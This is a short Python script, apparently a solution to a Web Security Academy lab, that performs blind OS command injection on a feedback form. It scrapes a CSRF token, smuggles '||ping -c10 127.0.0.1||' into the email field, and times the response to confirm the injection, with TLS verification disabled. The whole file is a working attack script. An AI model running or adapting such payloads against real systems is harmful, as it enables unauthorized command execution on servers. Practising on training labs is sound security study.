import threading
import time as time_module
import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(session, url):
    resp = session.get(url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]

def send_and_time(session, url, params, expected_delay=10, tolerance=2):
    result = {}

    def worker():
        result["resp"] = session.post(url, data=params, verify=False, allow_redirects=True)

    start = time_module.monotonic()
    thread = threading.Thread(target=worker)
    thread.start()

    elapsed = 0
    while thread.is_alive():
        thread.join(timeout=1)
        elapsed = time_module.monotonic() - start
        print(f"[{elapsed:.1f}s] waiting for response...")

    elapsed = time_module.monotonic() - start
    print(f"Response arrived after {elapsed:.2f}s")

    if elapsed >= (expected_delay - tolerance):
        print("Koated !!")
    else:
        print("ya siks")

    return result.get("resp")

def main():
    host = "https://0ad60028044b549e803f080a002600fe.web-security-academy.net/feedback"
    url = f"{host}/submit"
    space = " "
    ou = "||"
    localhost = "127.0.0.1"
    time = "10"
    exploit = f"{ou}ping{space}-c{time}{space}{localhost}{ou}"

    session = requests.Session()
    params = {
        "csrf": get_csrf_token(session, host),
        "name": "test",
        "email":"a",
        "subject": "test",
        "message":"test"
    }

    params["email"] += exploit
    resp = send_and_time(session, url, params, expected_delay=int(time))

if __name__ == "__main__":
    main()

